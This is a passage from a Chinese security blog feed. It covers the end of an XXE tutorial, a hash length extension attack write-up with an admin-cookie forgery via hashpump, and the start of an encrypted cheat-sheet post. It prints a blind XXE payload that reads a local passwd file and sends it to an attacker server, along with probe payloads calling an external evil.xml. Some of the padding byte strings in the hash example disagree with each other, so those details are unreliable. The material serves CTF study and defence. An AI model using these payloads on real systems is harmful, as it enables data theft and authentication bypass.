ANY[</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM &quot;file:///E:/passwd.txt&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % remote SYSTEM &quot;http://192.168.150.1/evil.xml&quot;&gt;</span></span><br><span class="line"><span class="string">%remote;</span></span><br><span class="line"><span class="string">%all;</span></span><br><span class="line"><span class="string">%send;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$xml</span>) ;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span> ;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$data</span>) ;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>evil.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span> <span class="string">&quot;&lt;!ENTITY % send SYSTEM &#x27;http://192.168.150.1/1.php?file=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;1.txt&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) ;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>攻击方法:</p><ul><li>模拟攻击者构造XXE请求：访问<code>http://localhost/test.php,</code> </li><li>然后存在漏洞的服务器会读出file的内容（E:&#x2F;1.txt）</li><li>通过带外通道发送给攻击者服务器上的1.php，</li><li>1.php做的事情就是把读取的数据保存到本地的1.txt中，</li><li>完成Blind XXE攻击。</li></ul><h4 id="0x005-一道CTF题看XXE"><a href="#0x005-一道CTF题看XXE" class="headerlink" title="0x005 一道CTF题看XXE"></a>0x005 一道CTF题看XXE</h4><p><a href="http://web.jarvisoj.com:9882/">访问题目链接</a></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1740059-20190818233452458-1561182357.png" alt="img"></p><p>输入什么都无反应或回显</p><p>burp抓包</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1740059-20190818233657878-1103669329.png" alt="img"></p><p>我们把content-type改成application&#x2F;xml的类型，然后下方就可以写入xml代码，先用dtd内部注入看一下能执行不</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1740059-20190818233941190-1244545008.png" alt="img"></p><p>发现可以成功执行，外部实体注入的话这里没有服务器，不能够测试，那么直接外部注入看是否成功</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1740059-20190818234227415-2110516468.png" alt="img"></p><p>发现可以读取文件，那么直接读取home&#x2F;ctf&#x2F;flag.txt内容</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1740059-20190818234330209-726072620.png" alt="img"></p><p>flag读取成功！</p><h4 id="0x006-防御XXE攻击"><a href="#0x006-防御XXE攻击" class="headerlink" title="0x006 防御XXE攻击"></a>0x006 防御XXE攻击</h4><p>1.使用开发语言提供的禁用外部实体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PHP：</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line"></span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">Python：</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure><p>2.过滤用户提交的XML数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。</span><br></pre></td></tr></table></figure><h4 id="0x007-判断是否存在XXE漏洞"><a href="#0x007-判断是否存在XXE漏洞" class="headerlink" title="0x007 判断是否存在XXE漏洞"></a>0x007 判断是否存在XXE漏洞</h4><p>1.检测XML是否会被解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;   </span><br><span class="line">&lt;!DOCTYPE ANY [       </span><br><span class="line">&lt;!ENTITY shit “this is shit”&gt;  </span><br><span class="line">]&gt;    </span><br><span class="line">&lt;root&gt;&amp;shit;&lt;/root&gt;  </span><br></pre></td></tr></table></figure><p>如果$shit;变成了”this is shit”，那就继续第二步。<br>2.检测服务器是否支持外部实体：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;  </span><br><span class="line">&lt;!DOCTYPE ANY [  </span><br><span class="line">&lt;!ENTITY % shit SYSTEM “http://yourhost/evil.xml”&gt;  </span><br><span class="line">%shit;  </span><br><span class="line">]&gt;  </span><br></pre></td></tr></table></figure><p>通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求evil.xml的HTTP request。<br>3.如果上面两步都支持，就看是否回显。如果能回显就直接引用外部实体注入。有时候服务器会不支持一般实体的引用，也就是在DTD之外无法引用实体，如果这样的话，只能使用Blind XXE攻击。<br>4.如果不能回显，就用<strong>Blind XXE攻击方法。</strong></p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://blog.csdn.net/u011721501/article/details/43775691">https://blog.csdn.net/u011721501/article/details/43775691</a></p><p><a href="https://www.smi1e.top/dsada/">https://www.smi1e.top/dsada/</a></p><p><a href="https://www.cnblogs.com/-chenxs/p/11374614.html">https://www.cnblogs.com/-chenxs/p/11374614.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hash Length Extension Attack</title>
      <link href="/2020/05/17/Hash-Length-Extension-Attack/"/>
      <url>/2020/05/17/Hash-Length-Extension-Attack/</url>
      
        <content type="html"><![CDATA[<h2 id="0×01-前言"><a href="#0×01-前言" class="headerlink" title="0×01 前言"></a>0×01 前言</h2><p>哈希长度扩展攻击利用了 md5、sha1 等加密算法的缺陷，可以在不知道原始密钥的情况下来进行计算出一个对应的 hash 值。主要摘录于freebuf深入理解hash长度扩展攻击(sha1为例)、二向箔学院相关赛题wp知识点，本篇为自己在看文章时的见解，对难点或者语义含糊的地方有详细的解释。本篇重复提及的便是重难点。</p><h2 id="0×02-hash原理-sha1"><a href="#0×02-hash原理-sha1" class="headerlink" title="0×02 hash原理(sha1)"></a>0×02 hash原理(sha1)</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14335264155804.png!small" alt="img"></p><p><strong>当hash函数拿到需要被hash的字符串后，先将其字节长度整除64，取得余数。如果该余数正好等于56，那么就在该字符串最后添加上8个字节的长度描述符（具体用bit表示）。如果不等于56，就先对字符串进行长度填充，填充时第一个字节为hex(80)，其他字节均用hex(00)填充，填充至余数为56后，同样增加8个字节的长度描述符（该长度描述符为需要被hash的字符串的长度，不是填充之后整个字符串的长度）。</strong></p><p>以上过程，称之为补位。</p><blockquote><p>1b(字节)&#x3D;8bit(比特)</p></blockquote><p>补位完成后，字符串以64位一组进行分组（因为上面的余数为56,加上8个字节的长度描述符后，正好是64位，凑成一组）。字符串能被分成几组就会进行多少次“复杂的数学变化”。每次进行“复杂的数学变化”都会生成一组新的registers值供下一次“复杂的数学变化”来调用。第一次“复杂的数学变化”会调用程序中的默认值。当后面已经没有分组可以进行数学变化时，该组生成的registers值就是最后的hash值。</p><p><strong>在sha1的运算过程中，为确保同一个字符串的sha1值唯一，所以需要保证第一次registers的值也唯一。所以在sha1算法中，registers具有初始值。如上图中的registers值0。</strong></p><p>Hash值的随机性完全依赖于进行“复杂的数学变化”时输入的registers值和该次运算中字符串分组的数据。如果进行“复杂数学变化”时输入的registers值和该次运算的字符串分组相同，那么他们各自生成的新的registers值也相同。</p><h2 id="0×03-举例"><a href="#0×03-举例" class="headerlink" title="0×03 举例"></a>0×03 举例</h2><p>这里是 ISCC 中题目中的 admin.php 的算法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;auth&quot;</span>])) &#123;</span><br><span class="line">   <span class="variable">$auth</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;auth&quot;</span>]);</span><br><span class="line">   <span class="variable">$hsh</span> = <span class="variable">$_COOKIE</span>[<span class="string">&quot;hsh&quot;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$hsh</span> !== <span class="title function_ invoke__">md5</span>(<span class="variable">$SECRET</span> . <span class="title function_ invoke__">strrev</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;auth&quot;</span>]))) &#123;    <span class="comment">//$SECRET is a 8-bit salt</span></span><br><span class="line">     <span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line">  <span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$auth</span>);</span><br><span class="line">  <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;auth&quot;</span>, <span class="variable">$s</span>);</span><br><span class="line">  <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;hsh&quot;</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$SECRET</span> . <span class="title function_ invoke__">strrev</span>(<span class="variable">$s</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>知道<code>md5($SECRET . strrev($_COOKIE[&quot;auth&quot;]))</code>的值</li><li>知道<code>$hsh</code>的值</li><li>可以算出另外一个 md5 值和另外一个 $hsh 的值，使得 <code>$hsh == md5($SECRET . strrev($_COOKIE[&quot;auth&quot;]))</code></li></ul><p>这样即可通过验证。如果要理解哈希长度扩展攻击，我们要先理解消息摘要算法的实现。拿 md5 算法举例。</p><h4 id="md5算法实现"><a href="#md5算法实现" class="headerlink" title="md5算法实现"></a>md5算法实现</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">对字符串abc的md5值计算,首先将其转化为16进制</span><br><span class="line">hex:</span><br><span class="line">61 62 63   abc</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200517200204830.png" alt="image-20200517200204830"></p><h4 id="补位"><a href="#补位" class="headerlink" title="补位"></a>补位</h4><p>要想完成消息摘要算法的实现，必须对消息进行补位，使得其字节长度整除64(b，取得余数，且该余数正好等于56(b),换句话说：</p><p>消息字节长度 mod 64 * 8(bit) &#x3D;56 * 8(bit),即为消息字节长度在对 512 取模后的值为 448</p><p>前面提及对于补位，填充时第一个字节为hex(80)，其他字节均用hex(00)填充，填充至余数为56后，这是在16进制的情况下，在二进制下，简言之，在消息后加1，然后加无限个0，直到mod 64 * 8(bit) &#x3D;56 * 8(bit)</p><h4 id="补长度"><a href="#补长度" class="headerlink" title="补长度"></a>补长度</h4><p><code>abc</code>是 3 个字母，也就是 3 个字节，24 bit</p><p>前面提及，在补完位后增加8个字节的长度描述符（该长度描述符为需要被hash的字符串的长度，不是填充之后整个字符串的长度），即二进制24转化为十六进制0x18。18+7个00</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200517202004860.png" alt="image-20200517202004860"></p><blockquote><p><strong>MD5中存储的都是小端方式</strong></p><p>0x12345678</p><p>在MD5运算时候存储的顺序是</p><p>0x78563412</p></blockquote><p>故后八位读取顺序为0x0000000000000018</p><h4 id="计算消息摘要"><a href="#计算消息摘要" class="headerlink" title="计算消息摘要"></a>计算消息摘要</h4><p>计算消息摘要必须用补位已经补长度完成之后的消息来进行运算，拿出 512 bit的消息（即64字节）。 计算消息摘要的时候，有一个初始的链变量，用来参与第一轮的运算。MD5 的初始链变量为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A=0x67452301</span><br><span class="line">B=0xefcdab89</span><br><span class="line">C=0x98badcfe</span><br><span class="line">D=0x10325476</span><br></pre></td></tr></table></figure><p>经过一次消息摘要后，上面的链变量将会<strong>被新的值覆盖</strong>，而最后一轮产生的链变量经过高低位互换（如：aabbccdd -&gt; ddccbbaa）后就是我们计算出来的 md5 值。</p><h4 id="具体计算细节"><a href="#具体计算细节" class="headerlink" title="具体计算细节"></a>具体计算细节</h4><p>将字符串和那四个链接变量经过一系列的复杂运算，算出一组新的A,B,C,D的值，如果消息小于512，只需要计算一次，这时候将新的ABCD的值按ABCD的顺序级联，然后输出，就是MD5的值，如果消息大于512的话，则需要计算多次，先计算出前512位的ABCD值然后用再用这个ABCD去计算后面512位的ABCD值以此类推，最后计算出来的ABCD经过拼接就是这串字符串的MD5值</p><h4 id="哈希长度扩展攻击的实现"><a href="#哈希长度扩展攻击的实现" class="headerlink" title="哈希长度扩展攻击的实现"></a>哈希长度扩展攻击的实现</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;secret.php&quot;</span>;</span><br><span class="line">@<span class="variable">$username</span>=(<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enc</span>(<span class="params"><span class="variable">$text</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>.<span class="variable">$text</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">enc</span>(<span class="variable">$username</span>) === <span class="variable">$_COOKIE</span>[<span class="string">&#x27;verify&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$username</span>, <span class="string">&quot;admin&quot;</span>)))&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;you are not admin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;verify&quot;</span>, <span class="title function_ invoke__">enc</span>(<span class="string">&quot;guest&quot;</span>), <span class="title function_ invoke__">time</span>()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">7</span>);</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;len&quot;</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>), <span class="title function_ invoke__">time</span>()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">7</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>知道<code>md5($key+guest)</code>的值</li><li>知道<code>len($key)</code>的值</li><li>要使得<code>cookie == md5($key+$username)</code>且<strong>enc($username)&#x3D;&#x3D;&#x3D;enc(“guest”)，$username中要包含admin</strong></li></ul><p>问题就出在覆盖上。我们得知了其 hash 值，以及我们有一个可控的消息。而我们得到的 hash 值正是最后一轮摘要后的经过高地位互换的链变量。可以想像一下，<strong>在常规的摘要之后把我们的控制的信息进行下一轮摘要，只需要知道上一轮消息产生的链变量</strong>。</p><p>即此时的<code>COOKIE==md5($key+guest)</code>正是最后一轮摘要后的经过高地位互换的链变量，在常规的摘要之后把我们的控制的信息进行下一轮摘要变成最终的<code>COOKIE==md5(经过覆盖的链表量+admin)</code>,此处要覆盖的链表量就是<code>md5($key+guest)</code></p><p>COOKIE中，MD5($key.guest)&#x3D;f8d7a112644f7e71e1e8ad068f144f61,以及$key的长度为21。我们来进行哈希长度扩展攻击。</p><h4 id="长度扩展"><a href="#长度扩展" class="headerlink" title="长度扩展"></a>长度扩展</h4><p>补位：</p><p>由于$key的长度是21,故我们可以随便设一个值只要满足长度为21即可，接着是guest的十六进制，接着是补充够56个字节</p><p>补长度：</p><p>$key.guest&#x3D;21+5&#x3D;26位,故长度为26 * 8&#x3D;208bit,根据md5的存储方式，我们长度在hex下补为</p><p><code>08 20 00 00 00 00 00 00</code></p><p>代码要求 POST 的值要有 admin 这一字符串，所以添加一个 admin 在末尾作为拓展</p><p>去掉前面的假的 $key，得到最终的 $username。<br><code>guest\x80\x00\x00\x00\x00\x98\x01\x00\x00\x00\x00\x00\x00admin</code><br>urlencode之后为<br><code>guest%80%00%00%00%00%9%01%00%00%00%00%00%00admin</code></p><p>为了让判断成立，还需要计算出拓展之后的 cookie</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(enc($username) === $_COOKIE[&#x27;verify&#x27;])</span><br></pre></td></tr></table></figure><p>带入enc函数返回的就是md5($key+guest+admin)的值。<br>然后把md5($key+guest)值作为加密admin的初始链变量</p><p><strong>小端式存储要倒过来</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MD5($key+guest)=f8d7a112 644f7e71 e1e8ad06 8f144f61</span><br><span class="line">A=0x12a1d7f8</span><br><span class="line">B=0x717e4f64</span><br><span class="line">c=0x06ade8e1</span><br><span class="line">d=0x614f148f</span><br></pre></td></tr></table></figure><p>用hashpump跑一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hashpump</span></span><br><span class="line">Input Si gnature: f8d7a112644f7e71e1e8ad068f144f61</span><br><span class="line">Input Data: guest</span><br><span class="line">Input Key Length: 46</span><br><span class="line">Input Data to Add: admin</span><br><span class="line">得到的md5值</span><br><span class="line">guest\x80\x00\x00\x00\x00\x98\x01 \x00\x00\x00\x00\x00\x00admin </span><br></pre></td></tr></table></figure><p>最后抓包，将得到md5的值放到cookie中，同时post<code>username=guest\x80\x00\x00\x00\x00\x98\x01 \x00\x00\x00\x00\x00\x00admin </code> </p><p>url编码\x转化为%</p><p><code>guest%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%d0%00%00%00%00%00%00%00admin</code></p><h4 id="相关利用工具"><a href="#相关利用工具" class="headerlink" title="相关利用工具"></a>相关利用工具</h4><p><strong>hashpump</strong></p><p>在各种哈希算法中哈希长度扩展攻击的利用工具。</p><p>下载地址：<a href="https://github.com/bwall/HashPump"><strong>hashpump</strong></a></p><p><strong>hash_extender</strong></p><p>哈希扩展器</p><p>下载地址：<a href="https://github.com/iagox86/hash_extender">哈希扩展器</a></p><p><strong>md5-extension-attack</strong></p><p>MD5 长度扩展攻击工具</p><p>下载地址：<a href="https://github.com/JoyChou93/md5-extension-attack">MD5 长度扩展攻击工具</a></p><h2 id="0x04总结"><a href="#0x04总结" class="headerlink" title="0x04总结"></a>0x04总结</h2><p>解决问题的关键还是要理解它的具体计算细节，本篇的具体计算细节</p><blockquote><p>如果消息小于512，只需要计算一次，这时候将新的ABCD的值按ABCD的顺序级联，然后输出，就是MD5的值，如果消息大于512的话，则需要计算多次，先计算出前512位的ABCD值然后用再用这个ABCD去计算后面512位的ABCD值以此类推，最后计算出来的ABCD经过拼接就是这串字符串的MD5值</p></blockquote><p><strong>对于题目,我们得到的 hash 值正是最后一轮摘要后的经过高地位互换的链变量。在常规的摘要之后把我们的控制的信息进行下一轮摘要，只需要知道上一轮消息产生的链变量。<br>原本的md5($key+$username)小于512bit，直接用初始的链变量计算一次就计算出了md5值。题目要求enc($username)&#x3D;&#x3D;&#x3D;enc(“guest”)，而且$username中要包含admin。我们可以通过填充把username扩展超过512bit，让他进行两次计算，第二次计算使用到的链变量是第一次计算得到的md5($key+guest)覆盖掉原来的链变量让他作为加密admin的链变量，最后把cookie改为这个经过覆盖的链表量+admin的md5加密值。</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020HW Cheat Sheet</title>
      <link href="/2020/05/14/2020HW-Cheat-Sheet/"/>
      <url>/2020/05/14/2020HW-Cheat-Sheet/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="67f6741133da76d06598a68422ac72eadf1dac32555c1426a6350740788f6ad3">a54b84261e37e1a5d7aa84d4052490d2399197e71fa95234ea104e82536b9e78220ca91e5a1293a19bbb48b02a7134dfeb20624553a3518aec5019679dd57c85c39c72394792f52130a88c45c873f02fc67bef61716654d6ac6672e0cec2a0f6e8d04c55264ce86156fdada8d299bb90fc5d6f7e61f1b51e4dc069641dc4405a2c7cc1853158527b275eaf887a627a30cc551002cb05793ffa5135b8caf56d58b4209e1d09e11f5b17a533b2a81695e7aca6688394e94b33dd575f41e39fddeb50192edf74e16347d968113ae97348567f5b5ccd6c40a0dac3395a4747cf251f1b2340d52ab248ce4ef25112ec1d47c5879d41c11658d32940d441558967cc3a1850e84ac8a1ea650372c49ab763e6a3e27f080d545cf9263f34e842409bfe14c5d7d4e76751de17604bb39a80e05aeb5c364a0f897f7a52a8da64f96d93679b83a00234152a2074dbaab2c6d9e4b03b6cd05b5033c43bb58ce847f49720a98f7bf9be4caee79615d3de354a003d915450a8f34b7c633496b3d63a0ef962bab4e1eb1034dd891cbfa03a4487d79dbad0c8a9b5a3abca950848a38140285af61d077d0eb864566e91d14adb059872e31a1122fc68871547bed4d9898dc13df14304c2ef4e0ad7812f179ad8ffd7d575a65983e6c96067b957cca4aed29d57594e54dd265b4d066671ba7daa8ded9f5ce817938c32c121bc4c87c0fe08f16186765bff81723a3464ea934ac8a07c9abf938afcb685ff50788828c69a2dc85f360e4bff351625c0abdfd106ae1442ec97fa277d24043f162eed3770410574bd2969638e65c1cf54cb0781d56636ad90b1a9d512f6fc04370f85b0be55fe29546afee682a9fbdb4da296fb64bb0669f3845e62073d1ece6f72eaf7968b66f0f8b8832babdbe2adab9b961963e7b310e811cbacdec5d2bdd3da8cb00df537d714e55491457292d022fe28fe38a18c71efcb0b628db31c8dbe63a050de4ef5778f4be3c3424d42e28e40beb92816780375c34cafe1e40bd275e8b2874c340a6305e7315fc7779cf94f99a16ae6317da157f6206091e6cdb9a614c4e12ad7a47e8d0fdc9d4e3fbb0f3ab137a7b3b3c65b3f6979e5fa22481f0daa90f03d7e27b3b9ad82366f522d615c2fbbe982601ce2bcf11b4514049f5831382aa112024b4bc2daf505315f18a2c26f2d67cead593d4420202a82d255e1fbc00434e7b4af861bc97878289a85320b5c9aff86fef0211e2d3dde764deb15a0c2f30a5c14639f7d39b905e053cd7bb543c6795f655297e38b590421d55a801ad1ac819d8c89e8738b9b0a6e193ff3712c47a4ec49b37581fd4e7527db71231ee355a0785fc8669ae2a3eb9c73a5efc0e448df08188457d80cd53e2c04c504fc05e6e9404beab2d3f4a08688b8105f8e17843751c123b5a42d002d677e814894a17bacf84fa3fdb697731518d2986eb00f3a026abf49db3f212fc167dda2e560a6313043809fe314c8a540b02f0d12642d9be02a308bf64e9b6e4ac989347dfa625472d81410b1509b8b6c76d0909316b8aa09492a1174439dbf633ea73c7aac597acbfd13d73cb8e74b43cc1eb18b128e017615ee491c739c8335b42738588a7e1212b1b57c8d22b00f8b34cffd466ebd35d5a1988137b730977d215dbaeba5c2fe60a7903bb5563244a1f18c18d41a53f8d6f6af7b3e499cdccc06601834e761af02b65a13f6b1d4973948006ff157f027daafc306ccea2314eaddfce8a1effbf1db3377755821c2263080a65d11627aa818b23a54fbd37b909a7f90ef2bbf09ea274b3ef7bbe1ed731ec42773f744e5b16cbf115a65ff323bb790b6036b1eaf17741a7ef13717be8525177cbc3dd6d550fe1ba244744de92f1e626fd7b70878e4ab192ae752ff4558648a372e88558c765c24f6095aba317f6664e9dffa1c72ac294258873ef70cd6aff05015e98288426d9d93e2e520290cedbc52870d61be6c393cc527239bbb3f824a5d585ebb3803fbb00e749fd4eb81aadde03b1e36d0bf61a5e8307e7525232cc900bab589a96983475231e2a05442ceea452098064f59119c194db1510ec5358c712f1cc36c7f749f219f96579b3b7cb70c12768644411cdc7a2f94989ba137f82b4cb76ae600961d48b6d2e0406bdf2987a42f2825d403586fd6200740aa30130ce56aef9b18c42bbeaf2e957136d6c9528aa55543e2e79e94ce6de2cfa7b26b5ced6454483f889e5d5b9043ffab9832b929a477bc095cdbd33f009eaf41f1d2c3ae9e9a95a04fe5e333efb6ff23d0d87073642fdd34f01951d9bc6eb17a58203712019a89b16673de843826e21758f87c279dfc8d27959581a762fe633be115a450f6812fd908885dc643cdfedf66f4473552df6a5ddbb8811c30fe9cc65a545d6aa118c0a9f0f11b049ca4a12e55def11ce28ec577ab863866ec8ba8e5b9038336ef11befe3a135a71d2a308b722885e34112268ac78d1c84b84329701aab1bde5c631fe608c46d95b5f2f67714b385b470bf9d38f1132fcd898bdfddd73c27cb42b2d594c2d148d0d52a1a0bd9f3521216114177435ba3ce0ad6b00d2771f48c9e3cba7641548010a0a8db5d0f7510ec93c422cb6e01424d4c5fa456fc1ccb98e915fce8d559eba1ae355a79703c00bcb2ec5c4f9930ac18de7d65119ccf9e605cf4b166882cfc465fab940626a36b9235cf23532f79be74e92d0f6ae7b819ec0a0b6cc3dd069791c4bfcef0920e71b95a6c01a0e4091d6b990cfc435535ec4b0627d2d1e2abbdb35c36fcd5a057d2ad8516a410e9dc957add2edb94d6fb1143d6b4203fbdb5e795cf7b22bc933b0048113f00af736ed7433f56c4efa6f7617cef858f02ad58b1e97d61cb6554eebd7bfb742843a433efa0bd547f3a35b117be2dd37bd9f5862bf204a517eb631c4757be7058aa09fb2670454d434546a7b704892243e3af3895845f98cbd43d93af0ed480a79e2282da3e0e722b5b7afdf079928442f1cf23703a9c581ef2be64d9f7246ff282658aa79afeb9ead55f7f6a7b76b235a5be14a57caa3db9c4d306d4abe93c9475033be87c347a7e2e58fefee84958a70b83abcdce11adfeea4555a43c379a57384ef6a29d56cd9c69061a6292fa37550ddbe8da1e416a62226ea26e1e10d0f29469bbafe62686d33ff42f2cafec8c5a13446309a569e4d5c19d10a4207f2685aa02835b8ec11ec84a4f6374ee2accd37a8316d33a58f9284bc9b2e293c64c24507132510bc5ea170d1aebbbeb344bcb8c18753d84a2492ecb4869c913f8b82bfeefcdf49675b08deb706facb6662c66a76dd3ea67cd6ab4d623b96230c3a10d7ee898565cc5ebb44547d38601cd4e9ee351dfda021c0f99418bd62f6980bebd44e19e8a692a5e0133c17a8080f9c8e76323f68a979bd00f85728287d2550f93d070693ab96b7c4bf162ca7785f63bbec8dc6f5a2e65b701fa6cc7441bb29afbf98e91cd6fbaa0df660b816fc3e2017b4fd3f717930c3d466df257e6f1d4ed1eed01